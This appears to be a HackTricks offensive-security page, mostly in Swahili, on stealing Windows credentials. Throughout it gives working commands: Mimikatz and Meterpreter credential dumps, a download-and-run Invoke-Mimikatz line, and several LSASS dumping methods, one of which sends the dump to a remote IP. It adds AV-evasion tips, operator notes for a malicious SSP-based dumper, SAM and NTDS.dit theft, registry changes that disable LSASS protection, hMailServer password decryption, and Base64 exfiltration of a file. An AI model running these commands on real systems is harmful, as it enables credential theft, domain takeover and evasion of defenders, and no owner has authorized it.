# Kuiba Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Tafuta mambo mengine ambayo Mimikatz inaweza kufanya katika** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Learn about some possible credentials protections here.**](credentials-protections.md) **Ulinzi huu unaweza kuzuia Mimikatz kutoa baadhi ya credentials.**

## Credentials na Meterpreter

Tumia the [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ambayo** nimeunda ili **search for passwords and hashes** ndani ya mwathiriwa.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Kuizunguka AV

### Procdump + Mimikatz

Kwa kuwa **Procdump kutoka kwa** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ni zana halali ya Microsoft**, haigunduliki na Defender.\
Unaweza kutumia zana hii ili **dump the lsass process**, **download the dump** na **extract** the **credentials locally** kutoka kwa dump.

Unaweza pia kutumia [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Mchakato huu unafanywa kiotomatiki kwa kutumia [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Kumbuka**: Baadhi ya **AV** zinaweza **kugundua** matumizi ya **procdump.exe to dump lsass.exe** kama **hatari**, hii ni kwa sababu zina **kugundua** kamba **"procdump.exe" and "lsass.exe"**. Kwa hivyo ni **siri zaidi** kupitisha kama **argument** **PID** ya lsass.exe kwa procdump **badala ya** jina lsass.exe.

### Dumping lsass with **comsvcs.dll**

A DLL named **comsvcs.dll** found in `C:\Windows\System32` is responsible for **dumping process memory** in the event of a crash. This DLL includes a **function** named **`MiniDumpW`**, designed to be invoked using `rundll32.exe`.\
It is irrelevant to use the first two arguments, but the third one is divided into three components. The process ID to be dumped constitutes the first component, the dump file location represents the second, and the third component is strictly the word **full**. No alternative options exist.\
Upon parsing these three components, the DLL is engaged in creating the dump file and transferring the specified process's memory into this file.\
Utilization of the **comsvcs.dll** is feasible for dumping the lsass process, thereby eliminating the need to upload and execute procdump. This method is described in detail at [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

The following command is employed for execution:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Unaweza kuotomatisha mchakato huu kwa kutumia** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass with Task Manager**

1. Bonyeza kulia kwenye Task Bar kisha bonyeza Task Manager
2. Bonyeza More details
3. Tafuta mchakato "Local Security Authority Process" kwenye kichupo cha Processes
4. Bonyeza kulia kwenye mchakato "Local Security Authority Process" kisha bonyeza "Create dump file".

### Dumping lsass with procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ni binary iliyosainiwa na Microsoft ambayo ni sehemu ya [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ni Protected Process Dumper Tool inayounga mkono obfuscating memory dump na kuhamisha kwenye remote workstations bila kuiweka kwenye diski.

**Vipengele muhimu**:

1. Bypassing PPL protection
2. Obfuscating memory dump files ili kuepuka Defender signature-based detection mechanisms
3. Kupakia memory dump kwa kutumia RAW na SMB upload methods bila kuiweka kwenye diski (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon inatuma dumper ya hatua-tatu iitwayo **LalsDumper** ambayo haifanyi wito kwa `MiniDumpWriteDump`, hivyo hooks za EDR kwenye API hiyo hazifanyi kazi:

1. **Stage 1 loader (`lals.exe`)** – inatafuta `fdp.dll` kwa ajili ya placeholder yenye herufi 32 ndogo `d`, inaibadilisha na njia kamili kwenda `rtu.txt`, inahifadhi DLL iliyorekebishwa kama `nfdp.dll`, na inaita `AddSecurityPackageA("nfdp","fdp")`. Hii inalazimisha **LSASS** kupakia DLL haribifu kama Security Support Provider (SSP) mpya.
2. **Stage 2 inside LSASS** – wakati LSASS inapakia `nfdp.dll`, DLL husoma `rtu.txt`, inafanya XOR kila bait na `0x20`, na inaweka blob iliyotafsiriwa kwenye kumbukumbu kabla ya kuhamisha utekelezaji.
3. **Stage 3 dumper** – payload iliyopakiwa inatekeleza tena mantiki ya MiniDump kwa kutumia **direct syscalls** zilizotatuliwa kutoka kwa majina ya API yaliyohashiwa (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Export maalum iitwayo `Tom` hufungua `%TEMP%\<pid>.ddt`, inatiririsha dump ya LSASS iliyosimbwa ndani ya faili, na inafunga handle ili exfiltration iweze kufanyika baadaye.

Vidokezo vya operator:

* Weka `lals.exe`, `fdp.dll`, `nfdp.dll`, na `rtu.txt` katika saraka moja. Stage 1 inaandika tena placeholder iliyowekwa kwa hard-code na njia kamili ya `rtu.txt`, hivyo kuvitenganisha kuvunja mnyororo.
* Usajili unafanyika kwa kuongeza `nfdp` kwenye `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Unaweza kuweka thamani hiyo mwenyewe ili LSASS ipakishe tena SSP kila kuanzishwa kwa mfumo.
* Faili za `%TEMP%\*.ddt` ni dumps zilizopigwa compression. Zifufue (decompress) mahali ulipo, kisha ziingize kwa Mimikatz/Volatility kwa ajili ya uchimbaji wa credentials.
* Kuendesha `lals.exe` kunahitaji haki za admin/SeTcb ili `AddSecurityPackageA` ifanikiwe; mara wito unaporudi, LSASS hupakia kwa uwazi SSP haribifu na kutekeleza Stage 2.
* Kuondoa DLL kutoka disk hakumaanishi kuiondoa kutoka LSASS. Futa entry ya registry na anzisha upya LSASS (reboot) au uiacha kwa persistence ya muda mrefu.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump siri za LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump ya NTDS.dit kutoka kwa DC lengwa
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump historia ya password ya NTDS.dit kutoka kwa DC lengwa
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Onyesha sifa ya pwdLastSet kwa kila akaunti ya NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Kuiba SAM & SYSTEM

Hizi faili zinapaswa **kuwekwa** katika _C:\windows\system32\config\SAM_ na _C:\windows\system32\config\SYSTEM_. Lakini **hutaweza kuzikopa tu kwa njia ya kawaida** kwa sababu zimehifadhiwa.

### Kutoka kwa Registry

Njia rahisi zaidi ya kuiba faili hizo ni kupata nakala kutoka Registry:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Pakua** faili hizo kwenye mashine yako ya Kali na **toa hashes** ukitumia:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Unaweza kunakili faili zilizolindwa kwa kutumia huduma hii. Unahitaji kuwa Administrator.

#### Kutumia vssadmin

binary ya vssadmin inapatikana tu katika matoleo ya Windows Server.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Lakini unaweza kufanya vivyo hivyo kutoka kwa **Powershell**. Huu ni mfano wa **jinsi ya kunakili SAM file** (diski kuu inayotumika ni "C:" na imehifadhiwa kwenye C:\users\Public) lakini unaweza kutumia hii kunakili faili yoyote iliyolindwa:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Msimbo kutoka kitabu: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Hatimaye, unaweza pia kutumia [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) ili kufanya nakala ya SAM, SYSTEM na ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Faili ya **NTDS.dit** inajulikana kama moyo wa **Active Directory**, ikihifadhi data muhimu kuhusu vitu vya watumiaji, vikundi, na uanachama wao. Hapa ndipo **password hashes** za watumiaji wa domain zilizo hifadhiwa. Faili hii ni **Extensible Storage Engine (ESE)** database na inapokewa kwenye **_%SystemRoom%/NTDS/ntds.dit_**.

Ndani ya database hii, meza kuu tatu zinaendeshwa:

- **Data Table**: Jedwali hili linahusika na kuhifadhi maelezo kuhusu vitu kama watumiaji na vikundi.
- **Link Table**: Linafuatilia uhusiano, kama uanachama wa vikundi.
- **SD Table**: **Security descriptors** za kila kitu huhifadhiwa hapa, zikihakikisha usalama na udhibiti wa upatikanaji kwa vitu vilivyohifadhiwa.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **part** of the **NTDS.dit** file could be located **inside the `lsass`** memory (you can find the latest accessed data probably because of the performance improve by using a **cache**).

#### Kudekripta hashes ndani ya NTDS.dit

Hash imefichwa mara 3:

1. Dekripta Password Encryption Key (**PEK**) kwa kutumia **BOOTKEY** na **RC4**.
2. Dekripta hash kwa kutumia **PEK** na **RC4**.
3. Dekripta hash kwa kutumia **DES**.

**PEK** ina thamani ile ile kwenye kila **domain controller**, lakini imefichwa ndani ya faili ya **NTDS.dit** kwa kutumia **BOOTKEY** ya faili ya **SYSTEM** ya **domain controller** (inatofautiana kati ya domain controllers). Hii ndiyo sababu ili kupata **credentials** kutoka faili ya **NTDS.dit** unahitaji faili za **NTDS.dit** na **SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Kukopa NTDS.dit kwa kutumia Ntdsutil

Available since Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Unaweza pia kutumia [**volume shadow copy**](#stealing-sam-and-system) njia kunakili faili **ntds.dit**. Kumbuka kwamba pia utahitaji nakala ya faili ya **SYSTEM** (tena, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) njia).

### **Kutoa hashes kutoka NTDS.dit**

Mara tu **umepata** faili **NTDS.dit** na **SYSTEM**, unaweza kutumia zana kama _secretsdump.py_ ili **kutoa hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Unaweza pia **kuvitoa kiotomatiki** ukitumia domain admin user halali:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Kwa **faili kubwa za NTDS.dit** inashauriwa kuzitoa kwa kutumia [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Mwishowe, unaweza pia kutumia **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ au **mimikatz** `lsadump::lsa /inject`

### **Kutoa vitu vya domain kutoka NTDS.dit hadi hifadhidata ya SQLite**

Vitu vya NTDS vinaweza kuchimbuliwa hadi hifadhidata ya SQLite kwa kutumia [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Sio tu siri zinaondolewa, bali pia vitu vyote kamili pamoja na sifa zao kwa ajili ya uchimbaji wa taarifa zaidi, ikiwa faili ya NTDS.dit mbichi tayari imepatikana.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive is optional but allow for secrets decryption (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Along with other information, the following data is extracted : user and machine accounts with their hashes, UAC flags, timestamp for last logon and password change, accounts description, names, UPN, SPN, groups and recursive memberships, organizational units tree and membership, trusted domains with trusts type, direction and attributes...

## Lazagne

Pakua binary kutoka [here](https://github.com/AlessandroZ/LaZagne/releases). Unaweza kutumia binary hii kutoa credentials kutoka kwa programu mbalimbali.
```
lazagne.exe all
```
## Zana nyingine za kutoa credentials kutoka SAM na LSASS

### Windows credentials Editor (WCE)

Zana hii inaweza kutumika kutoa credentials kutoka kwenye kumbukumbu. Pakua kutoka: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Inatoa credentials kutoka kwa faili la SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Toa credentials kutoka kwenye faili la SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Pakua kutoka:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) kisha **endesha** na nywila zitachimbuliwa.

## Kuchimba vikao vya RDP visivyotumika na kudhoofisha udhibiti wa usalama

Ink Dragon’s FinalDraft RAT inajumuisha tasker ya `DumpRDPHistory` — mbinu zake ni muhimu kwa kila red-teamer:

### Ukusanyaji wa telemetry kwa mtindo wa DumpRDPHistory

* **Malengo ya RDP zinazotoka** – chambua kila hive ya mtumiaji katika `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Kila subkey inaweka jina la seva, `UsernameHint`, na timestamp ya mwisho wa kuandika. Unaweza kuiga mantiki ya FinalDraft kwa PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Ushahidi wa RDP zinazoingia** – uliza logi `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` kwa Event IDs **21** (successful logon) na **25** (disconnect) ili ramani nani aliyeendesha mashine:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Mara unapojua ni Domain Admin gani anayehudhuria mara kwa mara, dump LSASS (kwa LalsDumper/Mimikatz) wakati kikao chao kilicho **disconnected** bado kiko. CredSSP + NTLM fallback huacha verifier na tokens zao katika LSASS, ambazo zinaweza kisha kutumika tena kupitia SMB/WinRM kupata `NTDS.dit` au kuandaa persistence kwenye domain controllers.

### Kupunguza viwango vya registry zinazolengwa na FinalDraft
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Kuweka `DisableRestrictedAdmin=1` kunalazimisha matumizi kamili ya vitambulisho/tiketi wakati wa RDP, ikiruhusu pivots za aina ya pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` inaondoa uchujaji wa tokeni wa UAC ili local admins wapate tokeni zisizo na vizuizi kupitia mtandao.
* `DSRMAdminLogonBehavior=2` inamruhusu msimamizi wa DSRM kuingia wakati DC iko mtandaoni, ikimpa washambuliaji akaunti nyingine ya ndani yenye vibali vya juu.
* `RunAsPPL=0` inaondoa kinga za LSASS PPL, ikifanya upatikanaji wa kumbukumbu kuwa rahisi kwa dumpers kama LalsDumper.

## hMailServer database credentials (baada ya kuathiriwa)

hMailServer huhifadhi DB password yake katika `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` chini ya `[Database] Password=`. Thamani ime Blowfish-encrypted kwa static key `THIS_KEY_IS_NOT_SECRET` na kubadilisha endianness kwa maneno ya 4-byte. Tumia hex string kutoka INI na snippet ya Python ifuatayo:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Kwa nywila ya maandishi wazi, nakili database ya SQL CE ili kuepuka kufungwa kwa faili, pakia provider wa 32-bit, na sasisha ikiwa inahitajika kabla ya kuchunguza hashes:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
The `accountpassword` column uses the hMailServer hash format (hashcat mode `1421`). Cracking these values can provide reusable credentials for WinRM/SSH pivots.
## LSA Logon Callback Interception (LsaApLogonUserEx2)

Baadhi ya zana hukamata **plaintext logon passwords** kwa kukamata LSA logon callback `LsaApLogonUserEx2`. Wazo ni ku-hook au ku-wrap callback ya authentication package ili credentials zikamatwe **during logon** (kabla ya hashing), kisha ziandikwe kwenye diski au zirudishwe kwa operator. Hii kawaida hufanywa kama helper inayochomekwa ndani ya au kujisajili na LSA, na kisha kurekodi kila tukio la kuingia lililofanikiwa (interactive/network) pamoja na username, domain na password.

Operational notes:
- Inahitaji local admin/SYSTEM ili kupakia helper katika authentication path.
- Credentials zilizokamatwa zinaonekana tu wakati kuingia kunapotokea (interactive, RDP, service, au network logon kulingana na hook).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) inahifadhi taarifa za muunganisho zilizohifadhiwa katika faili ya per-user `sqlstudio.bin`. Dumpers maalum zinaweza kuchambua faili na kurejesha saved SQL credentials. Katika shells zinazorejesha tu command output, faili mara nyingi hutumwa nje kwa kuiweka katika Base64 na kuichapisha kwenye stdout.
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Kwa upande wa operator, jenga tena faili na endesha dumper kwa ndani ili kurejesha credentials:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Marejeleo

- [Unit 42 – Uchunguzi wa Miaka ya Operesheni Zilizobaki Bila Kugunduliwa Zilizolenga Sekta zenye Thamani ya Juu](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Ndani ya Ink Dragon: Kufichua Mtandao wa Relay na Utendaji wa Ndani wa Operesheni ya Kivamizi ya Kificho](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
